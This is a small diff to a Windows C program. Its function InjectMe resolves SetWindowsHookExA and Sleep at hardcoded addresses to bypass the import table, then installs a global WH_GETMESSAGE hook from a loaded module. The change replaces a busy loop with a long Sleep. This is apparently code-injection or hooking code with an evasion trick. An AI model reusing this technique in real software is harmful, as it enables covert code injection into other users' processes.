@@ -18,7 +18,7 @@ DWORD WINAPI InjectMe(LPVOID lpParameter){
 	//0x7e431211 - SetWindowsHookExA - Skip IAT - user32
 	_SetWindowsHookEx swh = (_SetWindowsHookEx)0x7e431211;
 	//0x7c802446 - Sleep - Skip IAT - kernel32
-	//_Sleep slp = (_Sleep)0x7c802446;
+	_Sleep slp = (_Sleep)0x7c802446;
 
 	HOOKPROC installProc;
 	HMODULE hMod;
@@ -32,10 +32,7 @@ DWORD WINAPI InjectMe(LPVOID lpParameter){
 		return (DWORD)-2;
 	}
 	swh(WH_GETMESSAGE, installProc, hMod, 0);
-	//slp(0x0FFFFFF);
-	while (TRUE) {
-		(void)0;
-	};
+	slp(0x0FFFFFF);
 	return 0;
 }
 int main (){return InjectMe((LPVOID)NULL);}
